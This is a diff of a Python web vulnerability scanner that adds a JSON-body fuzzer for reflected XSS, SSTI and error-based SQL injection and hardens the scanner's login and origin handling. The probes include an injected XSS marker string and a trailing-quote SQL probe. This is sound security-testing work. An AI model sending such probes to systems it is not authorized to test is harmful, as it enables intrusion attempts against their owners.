+                        "web.ssti-verified", "high",
+                        "Template expression in input was evaluated server-side (SSTI)",
+                        action_url, target=target,
+                        evidence=f"form field '{name}' ({method.upper()}): {_SSTI_PAYLOAD} evaluated to {_SSTI_RESULT}",
+                        recommendation="Never render user input as a template; pass it as context data to a sandboxed engine.",
+                    )
+                )
+            body_s = _submit_form(action_opener, action_url, method, {**base, name: base[name] + "'"}, action_headers, timeout)
             if body_s and _SQL_ERROR_RE.search(body_s):
-                baseline = _submit_form(opener, action_url, method, base, headers, timeout)
+                baseline = _submit_form(action_opener, action_url, method, base, action_headers, timeout)
                 if not (baseline and _SQL_ERROR_RE.search(baseline)):
                     findings.append(
                         _finding(
@@ -1986,6 +2347,93 @@ def form_active_probe(
                         )
                     )
     return findings
+
+
+def json_active_probe(
+    url: str,
+    template: Mapping[str, object],
+    opener: urllib.request.OpenerDirector,
+    headers: Mapping[str, str],
+    timeout: float,
+    target: str,
+    *,
+    method: str = "POST",
+    max_fields: int = 10,
+) -> list[Finding]:
+    """Fuzz the string fields of a JSON request body for reflected XSS, SSTI and
+    error-based SQL injection — the API analogue of ``form_active_probe``.
+
+    ``template`` is an example body (e.g. an OpenAPI ``requestBody`` skeleton); only
+    its top-level string values are mutated. Bounded and non-destructive-ish; opt-in
+    and authorization-gated by the caller. ponytail: top-level strings only, nest a
+    recursive walk if deeply nested bodies turn out to matter.
+    """
+
+    if not isinstance(template, Mapping):
+        return []
+    string_fields = [k for k, v in template.items() if isinstance(v, str)]
+    findings: list[Finding] = []
+    token = secrets.token_hex(4)
+    for name in string_fields[:max_fields]:
+        marker = f"koda{token}\"><kdx>"
+        body_x = _submit_json(opener, url, method, {**template, name: marker}, headers, timeout)
+        if body_x and marker in body_x:
+            findings.append(
+                _finding(
+                    "web.reflected-xss-verified", "medium",
+                    "Unencoded reflected input detected; XSS context review required",
+                    url, target=target,
+                    evidence=f"JSON field '{name}' ({method}) reflected the marker unencoded",
+                    recommendation="Context-encode all user input on output and add a strict CSP.",
+                )
+            )
+        body_t = _submit_json(opener, url, method, {**template, name: _SSTI_PAYLOAD}, headers, timeout)
+        if _ssti_evaluated(body_t):
+            findings.append(
+                _finding(
+                    "web.ssti-verified", "high",
+                    "Template expression in input was evaluated server-side (SSTI)",
+                    url, target=target,
+                    evidence=f"JSON field '{name}' ({method}): {_SSTI_PAYLOAD} evaluated to {_SSTI_RESULT}",
+                    recommendation="Never render user input as a template; pass it as context data to a sandboxed engine.",
+                )
+            )
+        body_s = _submit_json(opener, url, method, {**template, name: str(template[name]) + "'"}, headers, timeout)
+        if body_s and _SQL_ERROR_RE.search(body_s):
+            baseline = _submit_json(opener, url, method, dict(template), headers, timeout)
+            if not (baseline and _SQL_ERROR_RE.search(baseline)):
+                findings.append(
+                    _finding(
+                        "web.sql-injection-error-verified", "high",
+                        "Input change triggers a database error; SQL injection is likely",
+                        url, target=target,
+                        evidence=f"JSON field '{name}' ({method}) produced a SQL error only with a trailing quote",
+                        recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
+                    )
+                )
+    return findings
+
+
+def _submit_json(
+    opener: urllib.request.OpenerDirector, url: str, method: str,
+    payload: Mapping[str, object], headers: Mapping[str, str], timeout: float,
+) -> str | None:
+    request = urllib.request.Request(
+        url, data=json.dumps(payload).encode("utf-8"),
+        headers={**dict(headers), "Content-Type": "application/json"}, method=method.upper(),
+    )
+    try:
+        with opener.open(request, timeout=timeout) as response:
+            return _read_bounded_body(response, _response_limit(opener), timeout).decode("utf-8", "replace")
+    except urllib.error.HTTPError as exc:
+        try:
+            return _read_bounded_body(exc, _response_limit(opener), timeout).decode("utf-8", "replace")
+        except Exception:
+            return None
+        finally:
+            exc.close()
+    except (urllib.error.URLError, ssl.SSLError, socket.timeout, OSError):
+        return None
 
 
 def _submit_form(
@@ -2083,10 +2531,12 @@ def _access_control_check(
         return []  # only meaningful when the authenticated context truly has access
 
     findings: list[Finding] = []
-    base_headers = {k: v for k, v in headers.items() if k.lower() != "cookie"}
+    # A comparison identity must not inherit the primary account's arbitrary
+    # credential headers (including custom API-key headers).
+    base_headers = {k: v for k, v in headers.items() if k.lower() in {"user-agent", "accept"}}
 
     if compare_unauth:
-        unauth_opener = network_context.build_opener() if network_context is not None else urllib.request.build_opener()
+        unauth_opener = network_context.build_opener() if network_context is not None else build_auth_opener()
         meta = _fetch_meta(unauth_opener, url, base_headers, timeout)
         if meta and meta[0] == 200 and not _looks_like_login(meta[1]) and _responses_equivalent(primary[1], meta[1]):
             findings.append(
@@ -2100,7 +2550,7 @@ def _access_control_check(
             )
 
     if secondary_headers:
-        secondary_opener = network_context.build_opener() if network_context is not None else urllib.request.build_opener()
+        secondary_opener = network_context.build_opener() if network_context is not None else build_auth_opener()
         meta = _fetch_meta(secondary_opener, url, {**base_headers, **secondary_headers}, timeout)
         if meta and meta[0] == 200 and not _looks_like_login(meta[1]) and _responses_equivalent(primary[1], meta[1]):
             findings.append(
@@ -2187,7 +2637,8 @@ def _same_host(seed_url: str, candidate: str) -> bool:
 
 
 def _is_allowed_origin(candidate: str, allowed_origins: set[str]) -> bool:
-    return _origin(candidate) in allowed_origins
+    origin = _normalized_origin(candidate)
+    return origin is not None and any(origin == _normalized_origin(allowed) for allowed in allowed_origins)
 
 
 # Static assets carry the same per-host headers as pages, so scanning them adds
@@ -2285,6 +2736,7 @@ def login(
     user_field: str | None = None,
     pass_field: str | None = None,
     request_url: str | None = None,
+    allowed_origins: Sequence[str] = (),
     extra_headers: Mapping[str, str] | None = None,
     timeout: float = 15.0,
     result: dict[str, object] | None = None,
@@ -2299,6 +2751,7 @@ def login(
     """
 
     warnings: list[str] = []
+    opener = _no_redirect_opener(opener)
     if result is not None:
         result.update({
             "status": "uncertain",
@@ -2308,6 +2761,10 @@ def login(
             "session_rotated": False,
             "message": "Login success could not yet be confirmed.",
         })
+    if not _secure_login_url(login_url):
+        if result is not None:
+            result.update({"status": "failed", "message": "Login requires HTTPS outside loopback."})
+        return [f"Login requires HTTPS outside loopback ({login_url}); scanning unauthenticated."], []
     target = urllib.parse.urlparse(login_url).netloc
     page_headers = {"User-Agent": _USER_AGENT, **dict(extra_headers or {})}
     request = urllib.request.Request(login_url, headers=page_headers)
@@ -2319,6 +2776,11 @@ def login(
         if result is not None:
             result.update({"status": "failed", "message": "Login page could not be loaded."})
         return [f"Login page could not be loaded ({login_url}): {getattr(exc, 'reason', exc)}"], []
+
+    if not _safe_secondary_url(login_url, page_url, {_origin(login_url)}):
+        if result is not None:
+            result.update({"status": "failed", "message": "Login page left its origin or downgraded HTTPS."})
+        return [f"Login page left its origin or downgraded HTTPS ({login_url}); scanning unauthenticated."], []
 
     parser = _FormParser()
     parser.feed(body)
@@ -2338,6 +2800,17 @@ def login(
     fields[user_key] = username
     fields[pass_key] = password
     action_url = request_url or (urllib.parse.urljoin(page_url, parser.action) if parser.action else page_url)
+    approved_actions = {_origin(page_url)}
+    if request_url:
+        approved_actions.update(_origin(origin) for origin in allowed_origins)
+    if not _safe_secondary_url(page_url, action_url, approved_actions):
+        if result is not None:
+            result.update({"status": "failed", "message": "Login form action left its approved origin or downgraded HTTPS."})
+        return [f"Login form action left its approved origin or downgraded HTTPS ({login_url}); scanning unauthenticated."], []
+    if not _secure_login_url(action_url):
+        if result is not None:
+            result.update({"status": "failed", "message": "Login form action requires HTTPS outside loopback."})
+        return [f"Login form action requires HTTPS outside loopback ({login_url}); scanning unauthenticated."], []
     cookies_before = _cookie_count(opener)
     sessions_before = _session_cookie_values(opener)
 
